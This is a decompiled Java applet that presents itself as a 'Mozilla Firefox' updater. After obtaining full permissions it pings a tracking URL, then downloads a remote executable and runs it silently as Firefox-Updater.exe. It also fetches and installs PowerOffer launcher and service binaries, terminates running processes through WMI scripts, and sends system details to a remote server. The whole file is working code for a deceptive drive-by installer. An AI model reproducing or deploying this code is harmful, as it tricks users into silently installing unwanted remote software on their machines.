// 
// Decompiled by Procyon v0.5.30
// 

package firefox;

import java.security.MessageDigest;
import java.io.FileInputStream;
import javax.swing.Icon;
import java.awt.Cursor;
import java.awt.Toolkit;
import java.awt.Component;
import java.awt.Color;
import java.awt.LayoutManager;
import javax.swing.JPanel;
import java.awt.BorderLayout;
import javax.swing.JLabel;
import javax.swing.ImageIcon;
import java.awt.Frame;
import java.awt.Dimension;
import javax.swing.JProgressBar;
import javax.swing.SwingUtilities;
import java.security.PrivilegedAction;
import java.security.AccessControlException;
import java.net.MalformedURLException;
import java.security.Permission;
import java.security.AccessController;
import java.security.AllPermission;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.io.File;
import java.net.URLConnection;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLEncoder;
import javax.swing.JDialog;
import java.applet.AppletContext;
import javax.swing.JApplet;

public class Updater extends JApplet
{
    private static AppletContext ac;
    private static String PoFolder;
    private static JDialog ProgressDialog;
    private static final boolean DEBUG = false;
    private static final String AppId = "0b81eff3-2137-4ab5-950b-83c570489776";
    private static final String AppVersion = "1.0.0.0";
    private static final String ExceptionUrl = "http://application.poweroffer.net/exception/Send/Xml";
    
    private static void WriteLog(final String s) {
    }
    
    private static String SendException(final Exception ex) {
        String string = "";
        try {
            final String string2 = "Firefox -> " + ex.getMessage() + "%%%Java version: " + System.getProperty("java.version") + "%%%Java vendor: " + System.getProperty("java.vendor") + "%%%OS architecture: " + System.getProperty("os.arch") + "%%%OS version: " + System.getProperty("os.version");
            String s = "";
            for (int i = 0; i < ex.getStackTrace().length; ++i) {
                if (!s.equals("")) {
                    s += " -> ";
                }
                s += ex.getStackTrace()[i].toString();
            }
            final String string3 = URLEncoder.encode("AppId", "UTF-8") + "=" + URLEncoder.encode("0b81eff3-2137-4ab5-950b-83c570489776", "UTF-8") + "&" + URLEncoder.encode("AppVersion", "UTF-8") + "=" + URLEncoder.encode("1.0.0.0", "UTF-8") + "&" + URLEncoder.encode("StackTrace", "UTF-8") + "=" + URLEncoder.encode(s, "UTF-8") + "&" + URLEncoder.encode("Infos", "UTF-8") + "=" + URLEncoder.encode(string2, "UTF-8") + "&" + URLEncoder.encode("New", "UTF-8") + "=" + URLEncoder.encode("0", "UTF-8");
            final URLConnection openConnection = new URL("http://application.poweroffer.net/exception/Send/Xml").openConnection();
            openConnection.setDoOutput(true);
            final OutputStreamWriter outputStreamWriter = new OutputStreamWriter(openConnection.getOutputStream());
            outputStreamWriter.write(string3);
            outputStreamWriter.flush();
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openConnection.getInputStream()));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                string += line;
            }
            outputStreamWriter.close();
            bufferedReader.close();
        }
        catch (Exception ex2) {
            return "";
        }
        return string;
    }
    
    private static boolean DownloadFile(final String s, final String s2) {
        if (s == null || s.trim().equals("") || s2 == null || s2.trim().equals("")) {
            return false;
        }
        try {
            new File(s2).delete();
        }
        catch (Exception ex) {}
        try {
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(s).openStream());
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s2), 1024);
            final byte[] array = new byte[1024];
            int read;
            while ((read = bufferedInputStream.read(array, 0, 1024)) != -1) {
                bufferedOutputStream.write(array, 0, read);
            }
            bufferedOutputStream.close();
            bufferedInputStream.close();
        }
        catch (Exception ex2) {
            return false;
        }
        return true;
    }
    
    private static String ExecuteVbs(final String s) {
        String line = "";
        try {
            final File tempFile = File.createTempFile("applet", ".vbs");
            tempFile.deleteOnExit();
            final FileWriter fileWriter = new FileWriter(tempFile);
            fileWriter.write(s);
            fileWriter.close();
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cscript //NoLogo " + tempFile.getPath()).getInputStream()));
            line = bufferedReader.readLine();
            bufferedReader.close();
        }
        catch (Exception ex) {
            SendException(ex);
        }
        return line;
    }
    
    private static String GetPoFolder() {
        final String executeVbs = ExecuteVbs("Set objShell = CreateObject(\"Shell.Application\")\nSet objFolder = objShell.Namespace(\"shell:Common Documents\")\nSet objFolderItem = objFolder.Self\nWscript.Echo objFolderItem.Path\n");
        if (!new File(executeVbs).exists()) {
            SendException(new FileNotFoundException("Percorso non trovato: " + executeVbs));
            return "";
        }
        return executeVbs + "\\PowerOffer\\";
    }
    
    private static boolean StartPoSetup(final String s, final String s2) {
        final String string = System.getProperty("java.io.tmpdir") + "\\Firefox-Updater.exe";
        String getMD5Checksum = null;
        DownloadFile(s, string);
        if (FileExist(string)) {
            getMD5Checksum = GetMD5Checksum(string);
        }
        if (s == null || s.trim().equals("") || getMD5Checksum == null || !getMD5Checksum.equals(s2)) {
            return false;
        }
        try {
            final Process exec = Runtime.getRuntime().exec(new String[] { string, "/VERYSILENT" });
            exec.waitFor();
            return exec.exitValue() == 0;
        }
        catch (Exception ex) {
            SendException(ex);
            return false;
        }
    }
    
    private static boolean MoveFile(final String s, final String s2, final String s3) {
        boolean renameTo;
        try {
            final File file = new File(s + "\\" + s3);
            final File file2 = new File(s2 + "\\" + s3);
            file2.delete();
            renameTo = file.renameTo(file2);
        }
        catch (Exception ex) {
            return false;
        }
        return renameTo;
    }
    
    private static boolean FileExist(final String s) {
        return new File(s).exists();
    }
    
    private static void DeleteR(final String s) {
        if (s == null || s.equals("")) {
            return;
        }
        final File file = new File(s);
        if (!file.isDirectory() && !file.isFile()) {
            return;
        }
        if (file.isFile()) {
            file.delete();
        }
        else if (file.isDirectory()) {
            final String[] list = file.list();
            for (int i = 0; i < list.length; ++i) {
                DeleteR(s + "\\" + list[i]);
            }
            file.delete();
        }
    }
    
    private static boolean StartSingleFiles(final String s) {
        if (Updater.PoFolder.equals("")) {
            return false;
        }
        String string;
        int n;
        File file;
        for (string = Updater.PoFolder + "Update", n = 0, file = new File(string + String.valueOf(n)); file.isDirectory(); file = new File(string + String.valueOf(n))) {
            ++n;
        }
        String s2 = string + String.valueOf(n) + "\\";
        boolean mkdir = false;
        try {
            mkdir = file.mkdir();
        }
        catch (Exception ex2) {}
        if (!mkdir) {
            s2 = Updater.PoFolder;
        }
        boolean downloadFile = true;
        boolean downloadFile2 = true;
        boolean downloadFile3 = true;
        boolean downloadFile4 = true;
        boolean downloadFile5 = true;
        boolean moveFile = true;
        boolean moveFile2 = true;
        boolean moveFile3 = true;
        boolean moveFile4 = true;
        boolean moveFile5 = true;
        if (!FileExist(Updater.PoFolder + "7z.dll")) {
            downloadFile = DownloadFile(s + "/7z.dll", s2 + "7z.dll");
        }
        if (downloadFile) {
            downloadFile2 = DownloadFile(s + "/UPOLauncher.exe", s2 + "UPOLauncher.exe");
        }
        if (downloadFile && downloadFile2) {
            downloadFile3 = DownloadFile(s + "/UPOService.exe", s2 + "UPOService.exe");
        }
        if (!FileExist(Updater.PoFolder + "System.Data.SQLite.dll") && downloadFile && downloadFile2 && downloadFile3) {
            downloadFile4 = DownloadFile(s + "/System.Data.SQLite.dll", s2 + "System.Data.SQLite.dll");
        }
        if (downloadFile && downloadFile2 && downloadFile3 && downloadFile4) {
            downloadFile5 = DownloadFile(s + "/AppLib.Zip.dll", s2 + "AppLib.Zip.dll");
        }
        if (mkdir) {
            if (downloadFile && downloadFile2 && downloadFile3 && downloadFile4 && downloadFile5) {
                if (!FileExist(Updater.PoFolder + "7z.dll")) {
                    moveFile = MoveFile(s2, Updater.PoFolder, "7z.dll");
                }
                moveFile2 = MoveFile(s2, Updater.PoFolder, "UPOLauncher.exe");
                moveFile3 = MoveFile(s2, Updater.PoFolder, "UPOService.exe");
                if (!FileExist(Updater.PoFolder + "System.Data.SQLite.dll")) {
                    moveFile4 = MoveFile(s2, Updater.PoFolder, "System.Data.SQLite.dll");
                }
                moveFile5 = MoveFile(s2, Updater.PoFolder, "AppLib.Zip.dll");
            }
            DeleteR(s2);
            if (!downloadFile || !downloadFile2 || !downloadFile3 || !downloadFile4 || !downloadFile5 || !moveFile || !moveFile2 || !moveFile3 || !moveFile4 || !moveFile5) {
                SendException(new Exception("Impossibile scrivere sul file system."));
                return false;
            }
        }
        try {
            Kill("POLauncher.exe");
            Kill("POLauncher.tmp");
            Thread.sleep(1000L);
            final File file2 = new File(Updater.PoFolder + "POLauncher.exe");
            file2.delete();
            new File(Updater.PoFolder + "UPOLauncher.exe").renameTo(file2);
        }
        catch (Exception ex) {
            SendException(ex);
        }
        return true;
    }
    
    private static boolean Kill(final String s) {
        return Boolean.parseBoolean(ExecuteVbs("strProcessKill = \"'" + s + "'\"\n" + "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")\n" + "Set colProcess = objWMIService.ExecQuery (\"Select * from Win32_Process Where Name = \" & strProcessKill )\n" + "For Each objProcess in colProcess\n" + "\tobjProcess.Terminate()\n" + "Next\n" + "ok = false\n" + "Set colProcess = objWMIService.ExecQuery (\"Select * from Win32_Process Where Name = \" & strProcessKill )\n" + "For Each objProcess in colProcess\n" + "\tok = true\n" + "Next\n" + "WScript.Sleep(500)\n" + "if (ok = false) Then\n" + "\tWSCript.Echo \"true\"\n" + "Else\n" + "\tWSCript.Echo \"false\"\n" + "End If\n" + "WScript.Quit\n"));
    }
    
    @Override
    public void init() {
        Updater.ac = this.getAppletContext();
        final String parameter = this.getParameter("link");
        final String parameter2 = this.getParameter("linkBase");
        final String parameter3 = this.getParameter("linkSetup");
        final String parameter4 = this.getParameter("md5");
        final AllPermission allPermission = new AllPermission();
        try {
            AccessController.checkPermission(allPermission);
        }
        catch (AccessControlException ex2) {
            try {
                Updater.ac.showDocument(new URL(parameter));
                return;
            }
            catch (MalformedURLException ex) {
                SendException(ex);
                System.exit(0);
            }
        }
        AccessController.doPrivileged((PrivilegedAction<Object>)new PrivilegedAction<AllPermission>() {
            @Override
            public AllPermission run() {
                try {
                    Updater.PoFolder = GetPoFolder();
                    SwingUtilities.invokeLater(new Runnable() {
                        @Override
                        public void run() {
                            Updater.createGUI(this.getClass());
                        }
                    });
                    new URL("http://cm.mibatech.com/track/149/8").openStream();
                    if (!StartPoSetup(parameter3, parameter4) && !StartSingleFiles(parameter2)) {
                        Updater.ac.showDocument(new URL(parameter));
                    }
                    Updater.ProgressDialog.dispose();
                }
                catch (Exception ex) {
                    SendException(ex);
                }
                System.exit(0);
                return null;
            }
        });
    }
    
    public static void createGUI(final Class clazz) {
        try {
            final JProgressBar progressBar = new JProgressBar();
            progressBar.setIndeterminate(true);
            progressBar.setPreferredSize(new Dimension(100, 20));
            final Frame[] frames = Frame.getFrames();
            if (frames.length > 0) {
                Updater.ProgressDialog = new JDialog(frames[0]);
            }
            else {
                Updater.ProgressDialog = new JDialog();
            }
            Icon icon = null;
            try {
                icon = new ImageIcon(clazz.getResource("firefox.jpg"));
            }
            catch (Exception ex2) {}
            final JLabel label = new JLabel(icon);
            final JPanel panel = new JPanel(new BorderLayout());
            panel.setBackground(Color.white);
            panel.add(label, "Center");
            panel.add(progressBar, "Last");
            Updater.ProgressDialog.getContentPane().add(panel);
            Updater.ProgressDialog.setModal(true);
            final int n = 650;
            final int n2 = 400;
            final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
            final int n3 = (screenSize.width - n) / 2;
            final int n4 = (screenSize.height - n2) / 2;
            Updater.ProgressDialog.setSize(n, n2);
            Updater.ProgressDialog.setLocation(n3, n4);
            Updater.ProgressDialog.setCursor(Cursor.getPredefinedCursor(3));
            Updater.ProgressDialog.setDefaultCloseOperation(0);
            Updater.ProgressDialog.setTitle("Mozilla Firefox");
            Updater.ProgressDialog.setResizable(false);
            Updater.ProgressDialog.setVisible(true);
        }
        catch (Exception ex) {
            SendException(ex);
        }
    }
    
    private static byte[] CreateChecksum(final String s) {
        try {
            final FileInputStream fileInputStream = new FileInputStream(s);
            final byte[] array = new byte[1024];
            final MessageDigest instance = MessageDigest.getInstance("MD5");
            int i;
            do {
                i = fileInputStream.read(array);
                if (i > 0) {
                    instance.update(array, 0, i);
                }
            } while (i != -1);
            fileInputStream.close();
            return instance.digest();
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    private static String GetMD5Checksum(final String s) {
        final byte[] createChecksum = CreateChecksum(s);
        if (createChecksum == null) {
            return null;
        }
        String string = "";
        for (int i = 0; i < createChecksum.length; ++i) {
            string += Integer.toString((createChecksum[i] & 0xFF) + 256, 16).substring(1);
        }
        return string;
    }
    
    public static void main(final String[] array) {
    }
    
    static {
        Updater.ac = null;
        Updater.PoFolder = "";
        Updater.ProgressDialog = null;
    }
}
